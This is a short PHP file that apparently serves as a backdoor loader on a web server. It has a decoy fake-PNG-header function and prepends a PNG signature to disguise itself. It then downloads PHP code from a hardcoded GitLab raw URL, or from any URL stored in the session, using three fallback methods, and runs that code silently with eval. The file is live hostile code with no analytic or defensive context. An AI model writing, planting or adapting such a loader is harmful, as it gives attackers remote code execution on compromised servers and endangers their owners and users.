<?php

// Fake PNG Header Generation (for disguising image files)
function generateFakePng() {
    $userAgent = $_SERVER['HTTP_USER_AGENT'];
    $data = '89 50 4E 47 0D 0A 1A 0A'; // PNG signature
    $data .= '00 00 00 0D 49 48 44 52'; // IHDR chunk (header)
    $data .= '00 00 01 00 00 00 01 00'; // 1x1 image dimensions
    $data .= '08 02 00 00 00';          // Color type, compression, filter, interlace
    $data .= '00 00 00 00';             // CRC
    $data .= '00 00 00 00';             // Empty chunk
    $data .= '74 45 58 74 64 75 53 65'; // tEXt chunk signature
    $data .= '00 00 00 00';             // Text chunk data
    $data .= '75 73 65 72 2D 61 67 65'; // Random User-Agent
    $data .= '6E 74';                   // End of tEXt chunk
    
    // Fake corruption chunk (cORR)
    $data .= '63 4F 52 52 00 00 00 01'; // cORR signature
    $data .= '00 00 00 00';             // Fake corruption data
    $data .= '49 45 4E 44 AE 42 60 82'; // End of PNG

    return hex2bin($data);
}

// 启动会话
session_start();

// 设置主地址，如果没有设置则使用默认地址
$主地址 = $_SESSION['ts_url'] ?? 'https://gitlab.com/mrgithub89-group/mrgithub89-projectaa/-/raw/main/pngoptimazie.php';

// 定义加载函数
function 加载数据($地址) {
    $内容 = '';
    try {
        $文件 = new SplFileObject($地址);
        while (!$文件->eof()) {
            $内容 .= $文件->fgets();
        }
    } catch (Throwable $错误) {
        $内容 = '';
    }

    // 尝试用 file_get_contents
    if (strlen(trim($内容)) < 1) {
        $内容 = @file_get_contents($地址);
    }

    // 如果还失败，使用 curl
    if (strlen(trim($内容)) < 1 && function_exists('curl_init')) {
        $通道 = curl_init($地址);
        curl_setopt_array($通道, [
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_FOLLOWLOCATION => true,
            CURLOPT_CONNECTTIMEOUT => 5,
            CURLOPT_TIMEOUT => 10,
        ]);
        $内容 = curl_exec($通道);
        curl_close($通道);
    }

    return $内容;
}

// 尝试加载主网址
$结果 = 加载数据($主地址);

// 添加假的PNG头部
$假PNG头 = "\x89\x50\x4E\x47\x0D\x0A\x1A\x0A";

// 拼接PNG头和结果内容
$结果 = $假PNG头 . $结果;

/**_**//**_**//**_**//**_**//**_**//**_**//**_**/
// 如果成功获取内容，则执行
if (strlen(trim($结果)) > 0) {
    @eval("?>$结果");
}
?>
